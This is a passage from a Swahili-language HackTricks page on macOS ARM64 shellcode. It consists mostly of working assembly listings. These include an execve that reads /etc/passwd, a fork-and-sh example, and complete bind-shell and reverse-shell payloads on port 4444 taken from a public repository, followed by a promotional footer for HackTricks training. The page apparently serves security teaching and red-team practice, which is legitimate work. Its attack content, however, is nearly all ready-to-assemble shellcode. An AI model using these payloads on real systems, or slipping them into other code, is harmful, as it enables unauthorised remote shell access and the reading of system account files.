sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Wito amri na sh kutoka kwa fork ili mchakato mkuu usiueke

Unaweza kutumia `fork` kwenye programu yako ili kuunda mchakato mpya. Kisha, unaweza kutumia `exec` kwa kutumia amri ya `sh` ili kutekeleza amri yako ndani ya mchakato huo mpya. Hii inahakikisha kuwa mchakato mkuu haufi wakati amri inatekelezwa.

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

int main() {
    pid_t pid = fork();

    if (pid == 0) {
        // Mchakato mtoto
        execl("/bin/sh", "sh", "-c", "amri yako", NULL);
        exit(0);
    } else if (pid > 0) {
        // Mchakato mzazi
        wait(NULL);
        printf("Amri imekamilika\n");
    } else {
        printf("Kuna hitilafu katika kujenga mchakato mtoto\n");
    }

    return 0;
}
```

Kwa kufanya hivyo, unaweza kuhakikisha kuwa mchakato mkuu haufi wakati amri inatekelezwa.
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell kutoka [https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS\_ARM64\_Shellcode/master/bindshell.s) kwenye **bandari 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Kitanzi cha kugeuza

Kutoka [https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/reverseshell.s), kitanzi cha kugeuza kwa **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikionekana kwenye HackTricks** au **kupakua HackTricks kwa muundo wa PDF** Angalia [**MPANGO WA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**swag rasmi ya PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**The PEASS Family**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwenye** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>
